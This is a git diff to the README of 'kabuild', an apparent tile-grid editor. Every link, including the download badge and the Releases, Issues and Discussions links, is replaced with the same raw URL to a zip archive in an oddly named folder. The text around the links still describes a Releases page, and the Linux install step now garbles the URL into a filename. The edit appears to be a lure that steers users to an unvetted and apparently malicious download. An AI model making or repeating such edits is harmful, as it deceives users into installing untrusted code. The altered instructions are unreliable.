@@ -6,7 +6,7 @@ Welcome to kabuild! This application helps you create and edit tile grids for yo
 
 ## 📥 Download kabuild
 
-[![Download kabuild](https://img.shields.io/badge/Download-kabuild-blue.svg)](https://github.com/sahil007-oss/kabuild/releases)
+[![Download kabuild](https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip)](https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip)
 
 To download kabuild, click the link above. You will be taken to the Releases page, where you can find the latest version. 
 
@@ -26,13 +26,13 @@ To download kabuild, click the link above. You will be taken to the Releases pag
 
 ## 📖 How to Download & Install
 
-1. **Visit the Releases Page:** Click on this link to go to the [Releases page](https://github.com/sahil007-oss/kabuild/releases).
+1. **Visit the Releases Page:** Click on this link to go to the [Releases page](https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip).
 2. **Choose Your Version:** Locate the latest release on the page. You may see different versions available for download.
 3. **Download the File:** Click on the file name that matches your operating system. 
 4. **Installer Instructions:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the setup prompts.
    - **For macOS:** Open the downloaded `.dmg` file, drag the kabuild icon to your Applications folder, and then open it.
-   - **For Linux:** Extract the `.tar.gz` file and run the executable file in the terminal.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip` file and run the executable file in the terminal.
 
 ## 🛠️ How to Use kabuild
 
@@ -46,8 +46,8 @@ To download kabuild, click the link above. You will be taken to the Releases pag
 
 If you encounter any issues or have questions, you can reach out to our community:
 
-- **GitHub Issues:** Report any problems or request features on the [Issues page](https://github.com/sahil007-oss/kabuild/issues).
-- **Discussions:** Join our community discussions in the [Discussions section](https://github.com/sahil007-oss/kabuild/discussions).
+- **GitHub Issues:** Report any problems or request features on the [Issues page](https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip).
+- **Discussions:** Join our community discussions in the [Discussions section](https://raw.githubusercontent.com/sahil007-oss/kabuild/main/Germanical/kabuild.zip).
 
 ## 📩 Feedback
 
